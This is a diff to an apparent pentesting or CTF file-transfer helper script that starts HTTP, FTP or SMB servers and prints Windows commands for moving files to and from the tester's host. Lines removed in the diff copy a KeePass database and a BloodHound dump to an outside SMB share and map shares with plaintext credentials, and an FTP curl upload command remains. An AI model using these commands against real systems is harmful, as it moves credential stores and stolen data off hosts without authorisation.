@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 
 import base64
 import http.server
@@ -218,19 +218,14 @@ def start_smb_server():
 
     smb_cmd = ["impacket-smbserver", "share", "$(pwd)", "-smb2support"]
 
-    mip = os.getenv('mip')
-    mipk = os.getenv('mipk')
-    argv1 = 'my_share'  # Reemplaza con el valor correspondiente de argv[1]
+    #mip = os.getenv('mip')
+    #mipk = os.getenv('mipk')
+    #argv1 = 'my_share'  # Reemplaza con el valor correspondiente de argv[1]
 
-    if mip:
-        print(f"\\\\{mip}\\{argv1}")
-
-    if mipk:
-        print(f"\\\\{mipk}\\{argv1}")
 
     if USERNAME and PASSWORD:
         smb_cmd.extend(["-username", USERNAME, "-password", PASSWORD])
-        print(Fore.GREEN + f"\n[>] SMB Server with authentication running" + Style.RESET_ALL)
+        print(Fore.GREEN + f"\n[>] SMB Server with authentication running\n" + Style.RESET_ALL)
         print(f"    User:" +  Fore.YELLOW + f"{USERNAME}"+ Style.RESET_ALL)
         print(f"    Pass:" + Fore.YELLOW + f"{PASSWORD}\n" + Style.RESET_ALL)
     else:
@@ -256,13 +251,19 @@ def print_transfer_instructions():
     elif SERVICE == 'sftp':
         print(f"C:\Windows\System32\curl.exe --ftp-ssl -u {USERNAME}:{PASSWORD} -T {FILE} ftp://{IP}:{PORT}/{FILE}")
     elif SERVICE == 'smb':
-        print(f"\n[+] SMB transfer instructions:")
-        print(f"copy CEH.kdbx \\10.10.14.3\smbFolder\CEH.kdbx")
-        print(f"copy \\10.10.14.3\smbFolder\CEH.kdbx CEH.kdbx")
-        print(f"net use x: \\192.168.45.161\smbfolder /user:kermit kermit123")
-        print(f"copy .\20240717142918_BloodHound.zip x:\blood.zip")
-        print(f"copy x:\blood.zip .\20240717142918_BloodHound.zip")
-        print(f"New-PSDrive -Name Z -PSProvider FileSystem -Root \\192.168.1.72\share -Credential (New-Object PSCredential ("kermit", (ConvertTo-SecureString "kermit123" -AsPlainText -Force))) -Persist")
+        print(Fore.GREEN + f"\n[+] SMB transfer instructions:\n" + Style.RESET_ALL)
+        print(f"\tcopy {FILE} \\\\{IP}\share\{FILE}")
+        print(f"\tcopy \\\\{IP}\share\{FILE} {FILE}")
+        
+        print(Fore.YELLOW + f"\n\t[+]" + Style.RESET_ALL + "Create temporary units")
+        print(f"\tnet use x: \\\\{IP}\share /user:{USERNAME} {PASSWORD}")
+        print(f'\tNew-PSDrive -Name Z -PSProvider FileSystem -Root \\\\{IP}\share -Credential (New-Object PSCredential ("{USERNAME}", (ConvertTo-SecureString "{PASSWORD}" -AsPlainText -Force))) -Persist')
+        print(Fore.YELLOW + f"\n\t[+]" + Style.RESET_ALL + "Copy to/from temporary units")
+        print(f"\tcopy .\{FILE} x:\{FILE}")
+        print(f"\tcopy x:\{FILE} .\{FILE}")
+        print(Fore.YELLOW + f"\n\t[+]" + Style.RESET_ALL + "Delete units")
+        print(f"\tnet use x: /delete")
+        print(f"\tRemove-PSDrive -Name Z")
     else:
         print(f"\n[+] HTTP transfer instructions:")
         print(f"   To download a file: curl http://{IP}:{PORT}/{FILE} -o {FILE}")
@@ -302,7 +303,7 @@ parser.add_argument('service', choices=['http', 'ftp', 'smb', 'https', 'ftps'], 
 parser.add_argument('-p', '--port', type=int, default=80, help="Port number to use (default: 80)")
 parser.add_argument('-u', '--user', type=str, help="Username for authentication (optional)")
 parser.add_argument('-f', '--file', type=str, default="<file>", help="Path to a file to be used by the server")
-parser.add_argument('-i', '--interface', type=str, default="tun0", help="Interface IP")
+parser.add_argument('-i', '--interface', type=str, default="eth0", help="Interface IP")
 parser.add_argument('-pw', '--password', type=str, help="Password for authentication (optional)")
 args = parser.parse_args()
 
@@ -310,8 +311,6 @@ args = parser.parse_args()
 SERVICE = args.service
 interface = args.interface
 IP = get_ip(interface)
-print("#######")
-print(IP)
 PORT = args.port
 FILE = args.file
 USERNAME = args.user
